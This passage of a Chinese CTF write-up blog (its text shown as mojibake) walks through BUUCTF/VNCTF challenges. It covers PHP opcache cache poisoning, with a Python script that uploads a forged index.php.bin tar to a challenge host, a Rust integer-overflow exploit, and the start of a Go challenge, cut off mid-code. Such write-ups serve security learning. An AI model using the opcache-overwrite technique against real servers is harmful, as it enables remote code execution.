opcache.ini <span class="variable">$PHP_INI_DIR</span>/conf.d/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;php&quot;</span>, <span class="string">&quot;-S&quot;</span>, <span class="string">&quot;0.0.0.0:8000&quot;</span> ]</span></span><br></pre></td></tr></table></figure>

<p>opcache.iniæ–‡ä»¶å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcache.enable=1</span><br><span class="line">opcache.file_cache_only=1</span><br><span class="line"># æŒ‡å®šç¼“å­˜ç›®å½•</span><br><span class="line">opcache.file_cache=/var/www/cache/opcache</span><br></pre></td></tr></table></figure>

<p>åŒç›®å½•ä¸‹å¯ä»¥å†™ä¸€ä¸ªå†…å®¹ä¸º<code>&lt;? phpinfo();?&gt;</code>çš„index.phpï¼Œè¿™æ ·å¯ä»¥æ–¹ä¾¿æŸ¥çœ‹éœ€è¦çš„åŠŸèƒ½æœ‰æ²¡æœ‰æ‰“å¼€ä¹‹ç±»çš„</p>
<p>:::warning</p>
<p>æ‰“å¼€opcacheåå¿…é¡»è¦æŒ‡å®šç¼“å­˜ç›®å½•ï¼Œå¦åˆ™å®¹å™¨ä¼šå¯åŠ¨å¤±è´¥</p>
<p>:::</p>
<p>åšå®Œè¿™äº›åç›´æ¥è·‘dockerï¼Œçœ‹çœ‹èƒ½å¦æ­£å¸¸è¿è¡Œ</p>
<img src="/2024/03/20/buuctf/buu/image-20240321134049931.png" class="" title="image-20240321134049931">

<p>okï¼Œå¯ä»¥è¿›å…¥å®¹å™¨å†…éƒ¨å¯»æ‰¾æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿äº†</p>
<img src="/2024/03/20/buuctf/buu/image-20240321134316132.png" class="" title="image-20240321134316132">

<p>è¿™é‡Œindex.php.binæ–‡ä»¶æ˜¯index.phpçš„ç¼–è¯‘ç¼“å­˜ï¼Œä½œç”¨å‰é¢è¯´è¿‡ï¼Œä¸å¤šèµ˜è¿°</p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹é¢˜ç›®ä¸Šçš„æ—¶é—´æˆ³æ˜¯å¤šå°‘</p>
<img src="/2024/03/20/buuctf/buu/image-20240321135643874.png" class="" title="image-20240321135643874">

<p>ç„¶åè½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼ŒæŠŠæ–‡ä»¶æ‹–å…¥010æ”¹ä¸€ä¸‹</p>
<img src="/2024/03/20/buuctf/buu/image-20240321135618245.png" class="" title="image-20240321135618245">

<h3 id="æ€ä¹ˆè®¡ç®—systemid"><a href="#æ€ä¹ˆè®¡ç®—systemid" class="headerlink" title="æ€ä¹ˆè®¡ç®—systemid"></a>æ€ä¹ˆè®¡ç®—systemid</h3><p>å…ˆè¯´è¯´ä¸ºä»€ä¹ˆè¦è®¡ç®—systemid</p>
<p>:::danger no-icon</p>
<p>è®¡ç®— System ID é€šå¸¸æ˜¯ä¸ºäº†ç¡®ä¿æ”»å‡»è€…ç”Ÿæˆçš„æ¶æ„ Opcache ç¼“å­˜æ–‡ä»¶ä¸ç›®æ ‡ç³»ç»Ÿçš„ Opcache é…ç½®å…¼å®¹ã€‚æ¯ä¸ªç³»ç»Ÿçš„  Opcache é…ç½®å¯èƒ½ä¸åŒï¼ŒåŒ…æ‹¬æ–‡ä»¶è·¯å¾„ã€æƒé™ç­‰ï¼Œè€Œ System ID å¯èƒ½è¢«ç”¨ä½œç¡®ä¿ç¼“å­˜æ–‡ä»¶ä¸ç‰¹å®šç³»ç»Ÿè®¾ç½®ç›¸åŒ¹é…çš„ä¸€ç§æ–¹å¼ã€‚</p>
<p>:::</p>
<p>æ ¹æ®å…¶ä»–åšå®¢å’Œå®˜æ–¹wpï¼Œå¤§è‡´å¯ä»¥å¾—å‡ºsystemidæœ‰ä»¥ä¸‹å‡ éƒ¨åˆ†</p>
<ol>
<li>PHP Version</li>
<li>Zend Extension ID</li>
<li>Zend Bin ID</li>
</ol>
<p>phpçš„å®˜æ–¹æºç ä¸­ä¹Ÿæœ‰ï¼Œå¯ä»¥å»çœ‹çœ‹<code>zend_system_id.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">zend_startup_system_id</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	PHP_MD5Init(&amp;context);</span><br><span class="line">	PHP_MD5Update(&amp;context, PHP_VERSION, <span class="keyword">sizeof</span>(PHP_VERSION)<span class="number">-1</span>);</span><br><span class="line">	PHP_MD5Update(&amp;context, ZEND_EXTENSION_BUILD_ID, <span class="keyword">sizeof</span>(ZEND_EXTENSION_BUILD_ID)<span class="number">-1</span>);</span><br><span class="line">	PHP_MD5Update(&amp;context, ZEND_BIN_ID, <span class="keyword">sizeof</span>(ZEND_BIN_ID)<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strstr</span>(PHP_VERSION, <span class="string">&quot;-dev&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Development versions may be changed from build to build */</span></span><br><span class="line">		PHP_MD5Update(&amp;context, __DATE__, <span class="keyword">sizeof</span>(__DATE__)<span class="number">-1</span>);</span><br><span class="line">		PHP_MD5Update(&amp;context, __TIME__, <span class="keyword">sizeof</span>(__TIME__)<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	zend_system_id[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±é¢˜ç›®å¯çŸ¥</p>
<p>PHP Version = 8.2.10ï¼ŒZend Extension ID = API420220829,NTSï¼ŒZend Bin ID = BIN_48888</p>
<p>å®é™…ä¸Šå¯ä»¥ç”¨ä¸€ä¸ªå·¥å…·ï¼Œ<a target="_blank" rel="noopener" href="https://github.com/GoSecure/php7-opcache-override">php7-opcache-override-master</a></p>
<img src="/2024/03/20/buuctf/buu/image-20240321152802802.png" class="" title="image-20240321152802802">

<p>å¾—å‡ºsystemidåï¼Œå°±å¯ä»¥ç”Ÿæˆä¸€ä¸ªtarå‹ç¼©åŒ…äº†</p>
<p>åœ¨é¢˜ç›®çš„<code>phpinfo()</code>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç³»ç»ŸæŒ‡å®šçš„ç¼“å­˜ç›®å½•ä¸º/tmpï¼Œè¿™é‡Œå°±ç”¨pythonæ¥SSRFäº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">sys_id = <span class="string">&#x27;00c2d2752120e3de9b90bf0eb5fcfcb9&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tar_file</span>():</span><br><span class="line">    tar_filename = <span class="string">&#x27;exp.tar&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(tar_filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        directory_info = tarfile.TarInfo(name=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html&#x27;</span>)</span><br><span class="line">        directory_info.<span class="built_in">type</span> = tarfile.DIRTYPE</span><br><span class="line">        directory_info.mode = <span class="number">0o777</span></span><br><span class="line"></span><br><span class="line">        tar.addfile(directory_info)</span><br><span class="line"></span><br><span class="line">        tar.add(<span class="string">&#x27;index.php.bin&#x27;</span>, arcname=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html/index.php.bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tar_file()</span><br><span class="line">url = <span class="string">&#x27;http://b6361428-f413-4d94-b4d3-0d5932e326ca.node5.buuoj.cn:81/?LuckyE=show_source&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;exp.tar&quot;</span>,<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&quot;rb&quot;</span>).read(),<span class="string">&quot;application/x-tar&quot;</span>)&#125;</span><br><span class="line">    res  = requests.post(url=url,files=file)</span><br><span class="line">    <span class="built_in">print</span>(res.request.headers)</span><br><span class="line">    <span class="keyword">return</span> res.request</span><br><span class="line">request_content = upload()</span><br><span class="line">upload_body = <span class="built_in">str</span>(request_content.body).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)</span><br><span class="line">content_length = request_content.headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(content_length)</span><br><span class="line"><span class="built_in">print</span>(upload_body)</span><br></pre></td></tr></table></figure>

<img src="/2024/03/20/buuctf/buu/image-20240321162508424.png" class="" title="image-20240321162508424">

<p>ç„¶åæŠŠæŠ¥æ–‡çš„bodyéƒ¨åˆ†å¤åˆ¶åˆ°SoapClienté‡Œé¢è¿›è¡ŒæŠ¥æ–‡ä¼ªé€ </p>
<p>ä¸è¿‡åé¢å¤ç°å¤±è´¥äº†ï¼Œæš‚æ—¶æ‰¾ä¸åˆ°åŸå› ï¼Œå…ˆæ”¾ç€ï¼ˆä¼ªé€ çš„è„šæœ¬å¯ä»¥å»çœ‹çœ‹<a target="_blank" rel="noopener" href="https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd">å®˜æ–¹æ–‡æ¡£</a>ï¼‰</p>
<h2 id="VNCTF2023-ç”µå­æœ¨é±¼"><a href="#VNCTF2023-ç”µå­æœ¨é±¼" class="headerlink" title="[VNCTF2023]ç”µå­æœ¨é±¼"></a>[VNCTF2023]ç”µå­æœ¨é±¼</h2><p>è¿™é“é¢˜è€ƒçš„æ˜¯rustæ•´æ•°æº¢å‡ºï¼Œå½“rustæŸä¸€ä¸ªæ•°å€¼è¶…è¿‡å®ƒæ‰€è§„å®šçš„èŒƒå›´åï¼Œå¦‚æœæ˜¯åœ¨releaseæ¨¡å¼ä¸‹è¿è¡Œï¼Œç¨‹åºå°±ä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯ä»¥ç¯ç»•çš„å½¢å¼å±•ç°å‡ºç»“æœã€‚ä¾‹å¦‚u8æ˜¯æŒ‡æ— ç¬¦å·æ•°å…«ä½ï¼ŒèŒƒå›´ä¸º[0,255]ï¼Œå¦‚æœä¸€ä¸ªæ•°ä¸º255ï¼Œåé¢å†åŠ 1è¾“å‡ºï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ç¨‹åºè¿”å›çš„å°±æ˜¯0ï¼Œå°±æ˜¯ä»ç»ˆåˆ°å§‹ã€‚ç›¸åº”çš„ï¼Œå¦‚æœæ˜¯0å‡1ï¼Œé‚£ä¹ˆè¿”å›çš„å°±æ˜¯255ï¼Œå°±æ˜¯ä»å§‹åˆ°ç»ˆã€‚</p>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæˆ‘ä»¬é‡ç‚¹çœ‹main.rs</p>
<p>æ‹¿åˆ°flagçš„æ¡ä»£ç æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#[get(&quot;/&quot;)]</span><br><span class="line">async fn index(tera: web::Data&lt;Tera&gt;) -&gt; Result&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">    let mut context = Context::new();</span><br><span class="line"></span><br><span class="line">    context.insert(&quot;gongde&quot;, &amp;GONGDE.get());</span><br><span class="line"></span><br><span class="line">    if GONGDE.get() &gt; 1_000_000_000 &#123;</span><br><span class="line">        context.insert(</span><br><span class="line">            &quot;flag&quot;,</span><br><span class="line">            &amp;std::env::var(&quot;FLAG&quot;).unwrap_or_else(|_| &quot;flag&#123;test_flag&#125;&quot;.to_string()),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    match tera.render(&quot;index.html&quot;, &amp;context) &#123;</span><br><span class="line">        Ok(body) =&gt; Ok(HttpResponse::Ok().body(body)),</span><br><span class="line">        Err(err) =&gt; Err(error::ErrorInternalServerError(err)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦åŠŸå¾·å¤§äº1000000000æ‰èƒ½æ‹¿åˆ°flag</p>
<p>è§‚å¯Ÿ<code>/upgrade</code>è·¯ç”±</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#[post(&quot;/upgrade&quot;)]</span><br><span class="line">async fn upgrade(body: web::Form&lt;Info&gt;) -&gt; Json&lt;APIResult&gt; &#123;</span><br><span class="line">    if GONGDE.get() &lt; 0 &#123;</span><br><span class="line">        return web::Json(APIResult &#123;</span><br><span class="line">            success: false,</span><br><span class="line">            message: &quot;åŠŸå¾·éƒ½ææˆè´Ÿæ•°äº†ï¼Œä½›ç¥–å¯¹ä½ å¾ˆå¤±æœ›&quot;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if body.quantity &lt;= 0 &#123;</span><br><span class="line">        return web::Json(APIResult &#123;</span><br><span class="line">            success: false,</span><br><span class="line">            message: &quot;ä½›ç¥–é¢å‰éƒ½æ•¢ä½œå¼Šï¼ŒçœŸä¸æ€•é­æŠ¥åº”å•Š&quot;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) &#123;</span><br><span class="line">        let mut cost = payload.cost;</span><br><span class="line">        </span><br><span class="line">        if payload.name == &quot;Donate&quot; || payload.name == &quot;Cost&quot; &#123;</span><br><span class="line">            cost *= body.quantity;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if GONGDE.get() &lt; cost as i32 &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: false,</span><br><span class="line">                message: &quot;åŠŸå¾·ä¸è¶³&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if cost != 0 &#123;</span><br><span class="line">            GONGDE.set(GONGDE.get() - cost as i32);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if payload.name == &quot;Cost&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;å°æ‰£ä¸€æ‰‹åŠŸå¾·&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; else if payload.name == &quot;CCCCCost&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;åŠŸå¾·éƒ½å¿«æ‰£æ²¡äº†ï¼Œæ€ä¹ˆç¡å¾—ç€çš„&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; else if payload.name == &quot;Loan&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;æˆ‘å‘ä½›ç¥–è®¸æ„¿ï¼Œä½›ç¥–å€Ÿæˆ‘åŠŸå¾·ï¼Œå¿«è¯´è°¢è°¢ä½›ç¥–&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; else if payload.name == &quot;Donate&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;å¥½äººæœ‰å¥½æŠ¥&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; else if payload.name == &quot;Sleep&quot; &#123;</span><br><span class="line">            return web::Json(APIResult &#123;</span><br><span class="line">                success: true,</span><br><span class="line">                message: &quot;è¿™æ˜¯ä»€ä¹ˆï¼ŸåºŠï¼Œç¡ä¸€ä¸‹&quot;,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    web::Json(APIResult &#123;</span><br><span class="line">        success: false,</span><br><span class="line">        message: &quot;ç¦æ­¢å¼€æ‘†&quot;,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå‘ç°å½“ä½ è¦â€œDonateâ€æˆ–â€œCostâ€æ—¶ï¼Œcostçš„å€¼ä¼šä¹˜ä¸Šä½ å‘é€çš„quantity</p>
<p>åœ¨<code>PAYLOADS</code>ä¸­ï¼Œæœ‰å…³costçš„å€¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const PAYLOADS: &amp;[Payload] = &amp;[</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;Cost&quot;,</span><br><span class="line">        cost: 10,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;Loan&quot;,</span><br><span class="line">        cost: -1_000,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;CCCCCost&quot;,</span><br><span class="line">        cost: 500,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;Donate&quot;,</span><br><span class="line">        cost: 1,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: &quot;Sleep&quot;,</span><br><span class="line">        cost: 0,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œå¯ä»¥åˆ©ç”¨å…ˆæ±‚åŠŸå¾·ï¼Œåå‡åŠŸå¾·æ¥è¾¾åˆ°æ•´æ•°æº¢å‡ºçš„ç›®çš„ï¼Œè¿™é‡Œcostå·²ç»è¡¨æ˜èŒƒå›´äº†ï¼Œæ˜¯æœ‰ç¬¦å·çš„32ä½æ•°</p>
<p>å³-2147483648~2147483647</p>
<p>æ ¹æ®å‰é¢è¯´çš„ï¼Œåªè¦æˆ‘ä»¬åŠŸå¾·æ‰£çš„å¤Ÿå¤šï¼Œå°±èƒ½å¤Ÿè¾¾åˆ°æ•´æ•°æº¢å‡ºï¼Œä¸ç„¶å°±ä¼šæŠ¥åŠŸå¾·ä¸è¶³</p>
<img src="/2024/03/20/buuctf/buu/image-20240321174221212.png" class="" title="image-20240321174221212">

<p>ç„¶åæ‰£ï¼ˆæ³¨æ„è¿™é‡Œquantityå¹¶ä¸æ˜¯æ— é™å¤§ï¼Œå®ƒä¹Ÿæ˜¯éœ€è¦åœ¨i32èŒƒå›´å†…çš„ï¼‰</p>
<img src="/2024/03/20/buuctf/buu/image-20240321174451215.png" class="" title="image-20240321174451215">

<p>å¾—å‡ºæ¥çš„è¿™ä¸ªæ•°å°±æ˜¯ï¼ˆ1000-quantity*10ï¼‰ã€‚è¿™é‡Œ10æ˜¯æŒ‡name=Costæ—¶costçš„å€¼ï¼Œpayloadé‡Œé¢æœ‰çš„ï¼Œquantityå°±æ˜¯ä½ ä¼ çš„æ•°äº†</p>
<p>æˆåŠŸé€ æˆæ•´æ•°æº¢å‡º</p>
<h2 id="VNCTF2023-BabyGo"><a href="#VNCTF2023-BabyGo" class="headerlink" title="[VNCTF2023]BabyGo"></a>[VNCTF2023]BabyGo</h2><p>ç»™äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œåªæœ‰<code>main.go</code>å€¼å¾—åˆ†æ</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/cryptor&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/fileutil&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/duke-git/lancet/random&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span></span><br><span class="line">	Path  <span class="type">string</span></span><br><span class="line">	Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	store := cookie.NewStore(random.RandBytes(<span class="number">16</span>))</span><br><span class="line">	r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line">	r.LoadHTMLGlob(<span class="string">&quot;template/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		session.Set(<span class="string">&quot;shallow&quot;</span>, userDir)</span><br><span class="line">		session.Save()</span><br><span class="line">		fileutil.CreateDir(userDir)</span><br><span class="line">		gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">		user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">		encoder := gob.NewEncoder(gobFile)</span><br><span class="line">		encoder.Encode(user)</span><br><span class="line">		<span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span 